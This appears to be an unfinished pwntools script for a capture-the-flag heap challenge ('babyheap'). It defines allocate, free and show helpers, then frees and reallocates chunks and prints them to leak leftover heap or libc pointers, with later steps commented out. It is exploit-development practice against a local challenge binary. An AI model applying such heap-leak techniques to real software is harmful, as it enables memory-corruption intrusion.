from pwn import *


elf = ELF("./babyheap_patched")
libc = ELF("./libc.so")
context.terminal = ["tmux", "splitw", "-h"]
p = process(elf.path)

if args.GDB:
    p = gdb.debug(elf.path)





def malloc(size, content):
    p.recv()
    p.sendline(b"M")
    p.recv()
    p.sendline(str(size))
    p.recv()
    p.sendline(content)


def free(index):
    p.recv()
    p.sendline(b"F")
    p.recv()
    p.sendline(str(index))

def show(index):
    p.recv()
    p.sendline(b"S")
    p.recv()
    p.sendline(index)
    data = p.recvline()
    return data
    

def exit():
    p.recv()
    p.sendline(b"E")


for i in range(10):
    malloc(10, chr(0x41 + i))

for i in range(9):
    free(i)

for i in range(8):
    malloc(10, '')

malloc(10, "")

for i in range(8):
    print(show(str(i)))

#for i in range(8):
#    free(str(i))

#for i in range(7):
#    malloc(10, chr(0x41 + i) * 7)
#
#malloc(10, b"ABCDEFG")
#
#for i in range(10):
#    print(show(str(i)))
p.interactive()